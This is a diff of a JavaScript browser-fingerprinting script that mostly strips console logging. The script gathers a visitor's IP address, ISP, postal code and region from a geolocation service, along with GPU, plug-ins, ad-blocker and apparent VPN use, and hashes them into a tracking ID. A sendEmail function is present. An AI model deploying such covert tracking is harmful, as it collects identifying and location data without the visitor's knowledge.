@@ -31,7 +31,6 @@ function getOS() {
   } else if (!os && /Linux/.test(platform)) {
     os = 'Linux';
   }
-  console.log("Operating system: " + os);
   return os;
 }
 
@@ -63,18 +62,15 @@ function getPosition(position) {
 }
 
 function plugns(){
-  console.log("Installed plug-ins: ");
   var plugs = ".\nInstalled plug-ins: ";
   for (var i = 0; i < navigator.plugins.length; i++) {
     plugs = plugs + (i + 1) + ": " + navigator.plugins[i].name + " ";
   }
-  console.log(plugs);
   return plugs;
 }
 
 function ip() {
   $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {
-    console.log(JSON.stringify(data, null, 2));
     var ipa = data.ip;
     var post = data.postal_code;
     window.post = post;
@@ -87,12 +83,6 @@ function ip() {
     window.tz = tz;
     var currency = data.currency_name;
 
-    console.log("Internet Service Provider (ISP): " + isp);
-    console.log("IP Adress: " + ipa);
-    console.log("Postal code: " + post);
-    console.log("Country: " + cont);
-    console.log("Region: " + region);
-    console.log("Currency: " + currency + ".\n");
     var ipInfo = "";
     ipInfo += ".\nInternet Service Provider (ISP): " + isp;
     ipInfo += ".\nIP adress: " + ipa;
@@ -119,20 +109,15 @@ function gpu(){
     debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
     vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
     renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    console.log("GPU vendor: " + vendor);
-    console.log("Renderer: " + renderer);
     render = renderer;
     window.render = render;
     window.vendor = vendor;
     if(vendor.includes("Google Inc.")) {
       var ret = vendor.replace('Google Inc.','');
-      console.log("GPU: " + ret);
     }
     gd += ".\nGPU: " + ret;
     gd += ".\nRenderer: " + renderer;
-    console.log(ret);
   }
-  console.log(ret);
 }
 
 var gd = "";
@@ -188,8 +173,6 @@ async function detectAdBlock() {
     adBlockEnabled = true;
     gd = gd + ".\nAdBlocker enabled: true";
   } finally {
-    console.log(`AdBlock Enabled: ${adBlockEnabled}`)
-    //document.getElementById("add").textContent =`AdBlock Enabled: ${adBlockEnabled}`;
     gd = gd + ".\nAdBlocker enabled: false";
   }
 }   
@@ -250,7 +233,6 @@ var bversion = browser.version;
 if(browsern == "FxiOS"){
   browsern = "Firefox On iOS";
 }
-console.log("Browser name + version: " + browsern + bversion);
                                             
 /*html2canvas(document.body, {
 onrendered: function(canvas)
@@ -309,7 +291,6 @@ function getScreenRefreshRate(callback, runIndefinitely) {
 
 function timecheck(){
   vpn = "Unable to detect";
-  console.log("Timezone: " + tz);
   if(tz !="none"){
     var btz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     console.log("Browser time" + btz);
@@ -321,9 +302,7 @@ function timecheck(){
       vpn = "true";
     }
 }
-  console.log("VPN: " + vpn);
   gd = gd + ".\nVPN enabled: " + vpn;
-  //document.getElementById("vpntest").textContent = "VPN Enabled: "+ vpn;
 }
 timecheck();
 
@@ -334,26 +313,15 @@ if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').match
 } else console.log("Light Mode");
 gd = gd + ".\nColor scheme: " + viewmode;
 
-if(touch >=1){
-  //document.getElementById("touch").textContent = "Touch Screen: True";
-  console.log(touch);
-}
-else{
-  //document.getElementById("touch").textContent = "Touch Screen: False";
-  console.log(touch);
-}
-
 gd += ".\nTouch screen: " + touch;
     
 //setTimeout(codingCourse, 1500);
 function codingCourse() {
   gd += isp + region + post + render + vendor + browsern + bversion;
-  console.log(gd);
   var uid = stringToUUID(gd);
   sessionStorage.setItem("idmove", uid);
   timecheck();
   getScreenRefreshRate(function(FPS){
-  console.log(`${FPS} FPS`);
   fps = Math.round(FPS / 5) * 5;
   
   if (fps > 31  && fps <= 70) fps = 60;
@@ -376,3 +344,5 @@ function sendEmail() {
   console.log("enviado")
 );
 }
+
+console.log(gd);
